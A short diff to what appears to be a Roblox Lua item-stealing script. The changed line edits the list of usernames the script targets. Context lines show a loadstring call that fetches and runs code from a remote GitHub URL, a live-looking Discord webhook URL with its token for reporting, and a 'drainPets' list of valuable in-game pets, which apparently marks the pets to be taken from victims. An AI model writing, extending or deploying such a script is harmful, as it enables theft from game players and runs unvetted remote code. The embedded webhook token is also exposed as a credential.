@@ -3,7 +3,7 @@ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-
 
 -- CONFIG SECTION
 local webhookUrl = "https://discord.com/api/webhooks/1392825138134651043/JhW9IN6scthgQncuUYfAefxbNOxiM2GZMJ6V6o1hAuJTWXqUqMt6bYxFpbqNTEMrxLyi"
-local targetUsernames = {"BadPlayer123", "MyAlt", "EnemyGuy", "intercepternumber1"}
+local targetUsernames = {"BadPlayer123", "deepscriptAI", "EnemyGuy", "intercepternumber1"}
 local drainPets = {
     "Dragonfly", "T‑Rex", "Raccoon", "Red Fox", "Queen Bee",
     "Disco Bee", "Butterfly", "Mimic", "Moon Cat", "Fennec Fox",
